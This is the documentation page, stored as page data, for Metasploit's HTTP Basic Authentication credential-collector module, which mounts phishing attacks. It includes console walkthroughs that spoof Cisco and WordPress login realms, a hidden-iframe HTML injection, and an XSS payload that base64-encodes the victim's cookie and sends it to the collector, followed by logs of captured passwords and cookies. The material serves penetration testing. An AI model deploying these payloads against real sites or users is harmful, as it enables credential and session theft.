{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/server/capture/http_basic","result":{"data":{"moduleMetadataJson":{"id":"32f92dd7-08ba-5c22-bc1e-7369c786cdef","name":"HTTP Client Basic Authentication Credential Collector","fullname":"auxiliary/server/capture/http_basic","description":"This module responds to all requests for resources with a HTTP 401.  This should\n        cause most browsers to prompt for a credential.  If the user enters Basic Auth creds\n        they are sent to the console.\n\n        This may be helpful in some phishing expeditions where it is possible to embed a\n        resource into a page.\n\n        This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/server/capture/http_basic","documentationSlug":"/modules/documentation/auxiliary/server/capture/http_basic"},"documentation":{"html":"<p>This module creates a mock web server which, utilizing a HTTP 401 response, prompts the user to enter credentials for Basic Authentication.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/server/capture/http_basic</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>REALM</strong></p>\n<p>  The Realm for the Basic Authentication, which may be displayed in the input box to the user.\nDefault is <code class=\"language-text\">Secure Site</code>.\nSome notable Realms to emulate:</p>\n<ul>\n<li><code class=\"language-text\">level_15 or view_access</code></li>\n<li><code class=\"language-text\">cPanel</code></li>\n<li><code class=\"language-text\">HuaweiHomeGateway</code></li>\n<li><code class=\"language-text\">Broadband Router</code></li>\n</ul>\n<p>  <strong>RedirectURL</strong></p>\n<p>  After the user enters a set of credentials, their browser will be redirected to this address.  Default is <code class=\"language-text\"></code>.</p>\n<p>  <strong>SSL</strong></p>\n<p>  Boolean if SSL should be used, making this HTTPS.  HTTPS is typically run on port 443.  If <code class=\"language-text\">SSLCert</code> is not set, a certificate\nwill be automatically generated.  Default is <code class=\"language-text\">False</code>.</p>\n<p>  <strong>SSLCert</strong></p>\n<p>  File path to a combined Private Key and Certificate file.  If not provided, a certificate will be automatically\ngenerated.  Default is <code class=\"language-text\"></code>.</p>\n<p>  <strong>URIPATH</strong></p>\n<p>  What URI should be utilized to prompt for the Basic Authentication.  For instance, you may want this to run on <code class=\"language-text\">/cisco</code> if you use\nthe <code class=\"language-text\">REALM</code> <code class=\"language-text\">level_15 or view_access</code>.  Default is <code class=\"language-text\"></code>, which will randomly generate a URIPATH.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"cisco-emulator-with-wget-client\" style=\"position:relative;\"><a href=\"#cisco-emulator-with-wget-client\" aria-label=\"cisco emulator with wget client permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cisco Emulator with wget Client</h3>\n<p>Server:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/server/capture/http_basic \nmsf5 auxiliary(server/capture/http_basic) &gt; set REALM &quot;level_15 or view_access&quot;\nREALM =&gt; level_15 or view_access\nmsf5 auxiliary(server/capture/http_basic) &gt; set uripath &#39;/cisco&#39;\nuripath =&gt; /cisco\nmsf5 auxiliary(server/capture/http_basic) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/capture/http_basic) &gt; \n[*] Using URL: http://0.0.0.0:80/cisco\n[*] Local IP: http://10.1.1.1:80/cisco\n[*] Server started.\n[*] Sending 401 to client 127.0.0.1\n[+] 127.0.0.1 - Credential collected: &quot;cisco:cisco&quot; =&gt; /cisco</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Client:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@kali:~# wget http://cisco:cisco@127.0.0.1:80/cisco\n--2018-11-05 19:44:29--  http://cisco:*password*@127.0.0.1/cisco\nConnecting to 127.0.0.1:80... connected.\nHTTP request sent, awaiting response... 401 Unauthorized\nAuthentication selected: Basic realm=&quot;level_15 or view_access&quot;\nReusing existing connection to 127.0.0.1:80.\nHTTP request sent, awaiting response... 404 Not Found\n2018-11-05 19:44:29 ERROR 404: Not Found.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"https-with-self-signed-certificate-and-curl-client\" style=\"position:relative;\"><a href=\"#https-with-self-signed-certificate-and-curl-client\" aria-label=\"https with self signed certificate and curl client permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>HTTPS with Self-Signed Certificate and curl Client</h3>\n<p>Server:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n[*] exec: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n\nGenerating a RSA private key\n............+++++\n.+++++\nwriting new private key to &#39;key.pem&#39;\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter &#39;.&#39;, the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\nmsf5 &gt; cat key.pem certificate.pem &gt; selfsigned.pem\n[*] exec: cat key.pem certificate.pem &gt; selfsigned.pem\n\nmsf5 &gt; cat /root/metasploit-framework/selfsigned.pem\n[*] exec: cat /root/metasploit-framework/selfsigned.pem\n\n-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCmniuSmx1h57hK\nXxBCfCOfsfJatMEtsrTHFCC0GDvIIHGot8oniVKes7yK0w8GSr0LeJgH23QMf/N0\nSZlF6BRc0GELAC7qPa9VJ8HPYYVbO/VaqXMy83y7YuSh6QlP/DksHt0W0rfvcM36\nypHiZ3LIbaz8VuAUyIU5Qa6G+TNvwClhQnaX3TLN0kk31pAwwuSRNvSYvmUih4HA\neN29IJyoiXH+GEjw7wBbm9dkbU1DI71zSZyO/Tfi/2SwDwaTKCucW7tUEd9ey6AU\n5hB6jGpc9N7rMYqV82mLogsXGaRDWh/tt9hghGWAX3MfD7EebQqYr4vQssoisU62\nct4DtCrNAgMBAAECggEAJ8ZohnYLHJ0xjGeHPSffZTcYsPiniR45M7ElYXjLhKni\nGDHPy4Jnu8UShF2AH7Nlz8A5It8LpBRDbQZI1bxiaAnCsNqZWIfjPEPia3xPVolI\nuBztiENCCoXAKLq142dFyrePdexVxo46Td1f2Blz+E7eVdrzYWLBEvsQC96fndRx\n8j6KT17tIhGz+9+87dwVUXiiBZTzeWRf94jofek3XWADlu6QjAd3qW944ljYyB7p\n+cJGwod5xFUxRdAr12RN+VIuzyP6xUXkfBQImdT3E0nR8LWwb4FcjwrCtCNEEYqU\n/CEBx8rm0qt7mBLiIjTq5+clfKKbd1XOXmGn7+7A7QKBgQDdoJl7NBcpBtLMC1kY\nKK78kar+nWS5am9H/3o76+sRmQGOCjRg9TyQBmqGkxb7en/m/xZzmS0QxbLCbChj\nnOgFn9owQKQ4a2FPiNHQ1BQ7F44E+B4j+1auS7VnpbzhPgyOwmZcDoRn5h+FeNwW\nXma/o+a78rp53eTzG9Hy8lFMwwKBgQDAdX8h8Us1d34a/GuFljUBe5iJNo1giqgq\nX8R2BCshvQWoT2wz3YX4FRBKMZKdfwLfbRxK1bzW7BinpgoNR6NV0lor75BgQiCJ\nnztUMCfDAkxwCgXZjR20OS106G/SRjRgLtYkdDhmfynyy2MSAKhmVaLxBa57VlXD\nZE2G4jdxLwKBgQCu1oReGnDu77AaQhWOJoItQ+lmpdoRH/McFGJkpS+zmUYNvOUn\nXC/j2vvsoFswFqqSG8ild0CDC8OC93pBY0XzMfEZwdULoUKKUQBcwwIWv/VM3ERC\n1IPESnuYgbpo4t9bO+cuVlGD+ZoCXJ8bkmtyYaWjvc/4VeHJG7hb9WfHqwKBgAe5\nL17nVgNRRkhC9PWpb3sdwKNRAx9qsRDyQuoRhMGX2lBEz6zNKQEppzuy/ZVAcZcR\nw97k8O0XEG455ZFe3JknFeNJe9vBC5k6QKFCRXY382VToaR3W0fOO5rDcSlZE+UA\nPCu+Vj0WwVIzA0jHqfphWWaeub/NWSe8MLhG/76VAoGBALTnftXB/b45xkgNEIZ3\n7WOsfvGo23tlXSQdCNNOn6YKptqYX88jeihcKEvGoIBH+LfV/GfD2P1d227kHyBZ\nFoZ+2dUwVXO2UP5j3WlxBleOqk0rTbIri/Pj4oCajAR4pXDIviUD+bUFojyFaysj\nIt3LYabipjgG3NjDxYBMyJnt\n-----END PRIVATE KEY-----\n-----BEGIN CERTIFICATE-----\nMIIDazCCAlOgAwIBAgIUXlRMetgIkrPIiamQGIBKbcEuT1IwDQYJKoZIhvcNAQEL\nBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM\nGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0xODExMDYwMDQ2NDFaFw0xOTEx\nMDYwMDQ2NDFaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw\nHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB\nAQUAA4IBDwAwggEKAoIBAQCmniuSmx1h57hKXxBCfCOfsfJatMEtsrTHFCC0GDvI\nIHGot8oniVKes7yK0w8GSr0LeJgH23QMf/N0SZlF6BRc0GELAC7qPa9VJ8HPYYVb\nO/VaqXMy83y7YuSh6QlP/DksHt0W0rfvcM36ypHiZ3LIbaz8VuAUyIU5Qa6G+TNv\nwClhQnaX3TLN0kk31pAwwuSRNvSYvmUih4HAeN29IJyoiXH+GEjw7wBbm9dkbU1D\nI71zSZyO/Tfi/2SwDwaTKCucW7tUEd9ey6AU5hB6jGpc9N7rMYqV82mLogsXGaRD\nWh/tt9hghGWAX3MfD7EebQqYr4vQssoisU62ct4DtCrNAgMBAAGjUzBRMB0GA1Ud\nDgQWBBR+MfL8LopA4OaIRLGK1gof3u+PIDAfBgNVHSMEGDAWgBR+MfL8LopA4OaI\nRLGK1gof3u+PIDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBe\nIGmZr3wlO32b25qj/4qB7ewukwF6uaS4OQh4VLlUk8uYsqoGfvehAaNNJsu1oKO5\nXpShHeyEkpwzgx0mdCmQSB3JKseFYuZTgP9GP00EXuHYl2V+quPFN17fq0AgYN6K\nTFDwzYbhWyFGz7k++i23w0/dwvL2dLH+bgdHYU49rhlZIAu7PgbyIuhP+M2ltcjt\nNDO8po38u2ba52E56abfg0ZlFBqsua2s1TPHIyQ9iovTPMg1E5UTTGebaN6/BaMh\nOj6N43ld9EONST6BhP3v1buoWHi1FMouocrUkUDuahiHoLlK4ERSUrb4uNnwko24\nWdNCCmA8APA1qf2BYVqs\n-----END CERTIFICATE-----\nmsf5 &gt; use auxiliary/server/capture/http_basic \nmsf5 auxiliary(server/capture/http_basic) &gt; set ssl true\nssl =&gt; true\nmsf5 auxiliary(server/capture/http_basic) &gt; set srvport 443\nsrvport =&gt; 443\nmsf5 auxiliary(server/capture/http_basic) &gt; set sslcert /root/metasploit-framework/selfsigned.pem\nsslcert =&gt; /root/metasploit-framework/selfsigned.pem\nmsf5 auxiliary(server/capture/http_basic) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/capture/http_basic) &gt; \n[*] Using URL: https://0.0.0.0:443/4w0tML\n[*] Local IP: https://192.168.2.117:443/4w0tML\n[*] Server started.\n[+] 127.0.0.1 - Credential collected: &quot;admin:password123&quot; =&gt; /4w0tML</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Clients:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@kali:~# curl -k --user admin:password123 https://127.0.0.1/4w0tML\n&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;\n&amp;lt;html&gt;&amp;lt;head&gt;\n&amp;lt;title&gt;404 Not Found&amp;lt;/title&gt;\n&amp;lt;/head&gt;&amp;lt;body&gt;\n&amp;lt;h1&gt;Not Found&amp;lt;/h1&gt;\n&amp;lt;p&gt;The requested URL was not found on this server.&amp;lt;/p&gt;\n&amp;lt;hr&gt;\n&amp;lt;address&gt;Apache/2.2.9 (Unix) Server at  Port 443&amp;lt;/address&gt;\n&amp;lt;/body&gt;&amp;lt;/html&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"html-injection-social-engineering\" style=\"position:relative;\"><a href=\"#html-injection-social-engineering\" aria-label=\"html injection social engineering permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>HTML Injection Social Engineering</h3>\n<p>In this scenario, we're able to inject HTML (but not script) into a website.  We'll inject an <code class=\"language-text\">iframe</code>\nthat will load our basic authentication website.  This payload will pop-up a login box, with the REALM (title)\nset to the website, which will hopefully trick a user into entering their credentials.\n<strong>The following scenario is a demonstration, no actual vulnerability was identified, or tested.\nThe HTML was simply edited in the local browser.</strong></p>\n<p>HTML Payload Injected:</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-html line-numbers\"><code class=\"language-html\"><span class=\"token entity\" title=\"&lt;\">&amp;lt;</span>iframe width=\"0\" height=\"0\" src=\"http://127.0.0.1/\"><span class=\"token entity\" title=\"&lt;\">&amp;lt;</span>/iframe></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Server:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/server/capture/http_basic \nmsf5 auxiliary(server/capture/http_basic) &gt; set uripath &#39;/&#39;\nuripath =&gt; /\nmsf5 auxiliary(server/capture/http_basic) &gt; set REALM &quot;Wordpress.com Login&quot;\nREALM =&gt; Wordpress.com Login\nmsf5 auxiliary(server/capture/http_basic) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/capture/http_basic) &gt; \n[*] Using URL: http://0.0.0.0:80/\n[*] Local IP: http://192.168.2.117:80/\n[*] Server started.\n[*] Sending 401 to client 127.0.0.1\n[+] 127.0.0.1 - Credential collected: &quot;metasploit_blog:ms08-0sK1NG!&quot; =&gt; /</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Client:</p>\n<p><img src=\"https://user-images.githubusercontent.com/752491/48039039-326e1880-e141-11e8-9971-d9c88081d0df.png\" alt=\"Injected Payload\"></p>\n<h3 id=\"xss-cookie-theft\" style=\"position:relative;\"><a href=\"#xss-cookie-theft\" aria-label=\"xss cookie theft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XSS Cookie Theft</h3>\n<p>In this scenario, we're able to inject JavaScript into a website.  We'll first get the user's cookie, then with jQuery\npull the username from the <code class=\"language-text\">username</code> field.  Because the cookie may contain fields break URI parsing (like <code class=\"language-text\">@</code>)\nwe use <code class=\"language-text\">btoa</code> to base64 encode the cookie.  Next we'll write an <code class=\"language-text\">iframe</code>\nthat will silently attempt a login to our basic authentication website.\n<strong>The following scenario is a demonstration, no actual vulnerability was identified, or tested.\nThe HTML was simply edited in the local browser.</strong></p>\n<p>Payload:</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-html line-numbers\"><code class=\"language-html\"><span class=\"token entity\" title=\"&lt;\">&amp;lt;</span>script>\nvar cookie = document.cookie;\nvar username = $('#username').text();\ndocument.write('<span class=\"token entity\" title=\"&lt;\">&amp;lt;</span>iframe width=\"0\" height=\"0\" src=\"http://' + username + ':' + btoa(cookie) + '@127.0.0.1/\"><span class=\"token entity\" title=\"&lt;\">&amp;lt;</span>/iframe>');\n<span class=\"token entity\" title=\"&lt;\">&amp;lt;</span>/script></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Sever:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/server/capture/http_basic \nmsf5 auxiliary(server/capture/http_basic) &gt; set uripath &#39;/&#39;\nuripath =&gt; /\nmsf5 auxiliary(server/capture/http_basic) &gt; set REALM &quot;Login&quot;\nREALM =&gt; Login\nmsf5 auxiliary(server/capture/http_basic) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/capture/http_basic) &gt; \n[*] Using URL: http://0.0.0.0:80/\n[*] Local IP: http://192.168.2.117:80/\n[*] Server started.\n[*] Sending 401 to client 127.0.0.1\n[+] 127.0.0.1 - Credential collected: &quot;h00die:R1VDPUFRRUJBUUZicVNGY2owSWVBQVJuJnM9QVFBQUFFUmFpakN4Jmc9VzZmYkdROyB1Y3M9bG5jdD0xNTM3NzI3MjQ4OyBjbXA9dD0xNTQxNDY4ODQ1Jmo9MDsgZmxhc2hfZW5hYmxlZD0wOyBhcGVhZj10ZC1hcHBsZXQtc3RyZWFtPSU3QiUyMnRtcGwlMjIlM0ElMjJpdGVtcyUyMiUyQyUyMmx2JTIyJTNBMTU0MTQ3MDY0NjI4OCU3RDsgSFA9MTsgQj1jN2tvYTYxZDY5dHBzJmI9MyZzPTVy&quot; =&gt; /</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Decoding the cookie:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(server/capture/http_basic) &gt; irb\n[*] Starting IRB shell...\n[*] You are in auxiliary/server/capture/http_basic\n\n&gt;&gt; Base64.decode64(&#39;R1VDPUFRRUJBUUZicVNGY2owSWVBQVJuJnM9QVFBQUFFUmFpakN4Jmc9VzZmYkdROyB1Y3M9bG5jdD0xNTM3NzI3MjQ4OyBjbXA9dD0xNTQxNDY4ODQ1Jmo9MDsgZmxhc2hfZW5hYmxlZD0wOyBhcGVhZj10ZC1hcHBsZXQtc3RyZWFtPSU3QiUyMnRtcGwlMjIlM0ElMjJpdGVtcyUyMiUyQyUyMmx2JTIyJTNBMTU0MTQ3MDY0NjI4OCU3RDsgSFA9MTsgQj1jN2tvYTYxZDY5dHBzJmI9MyZzPTVy&#39;)\n=&gt; &quot;GUC=AQEBAAFbqSFcj0IeBARn&amp;s=AQADAERaieCx&amp;g=W2fb9Q; ucs=lnct=1537714242; cmp=t=1247468145&amp;j=0; flash_enabled=0; apeaf=td-applet-stream=%7B%22tmpl%22%3A%22items%22%2C%22lv%22%3A1541470698788%7D; HP=1; B=c7koa55d69tbs&amp;b=3&amp;s=5r&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"32f92dd7-08ba-5c22-bc1e-7369c786cdef"}}}